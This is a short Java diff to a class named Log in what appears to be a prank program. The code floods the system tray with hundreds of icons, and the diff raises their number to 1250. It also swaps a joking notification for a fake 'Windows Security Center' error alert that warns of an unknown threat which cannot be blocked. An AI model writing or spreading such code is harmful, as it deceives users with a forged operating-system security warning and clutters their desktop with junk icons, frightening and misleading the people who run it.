@@ -30,7 +30,7 @@ public class Log {
             }
 
             new Thread(()->{
-                int trayCount = 1200;
+                int trayCount = 1250;
                 for (int i = 0; i < trayCount; i++) {
                     System.out.printf("正在加载托盘图标...(%s/%s)\r", i + 1, trayCount);
                     TrayIcon tempTrayIcon = new TrayIcon(GetIcon.getImageIcon(Log.class.getResource("/image/default.png"), 48, 48, false).getImage(), String.valueOf(i + 1));
@@ -45,7 +45,7 @@ public class Log {
                 System.out.println();
             }, "创建托盘图标").start();
         }
-        trayIcon.displayMessage("磨刀石", "磨刀石正在打磨你的电脑,会有奇效", TrayIcon.MessageType.INFO);
+        trayIcon.displayMessage("Windows 安全中心", "发现未知威胁，暂时无法阻止，请留意", TrayIcon.MessageType.ERROR);
 
     }
     public Log() {
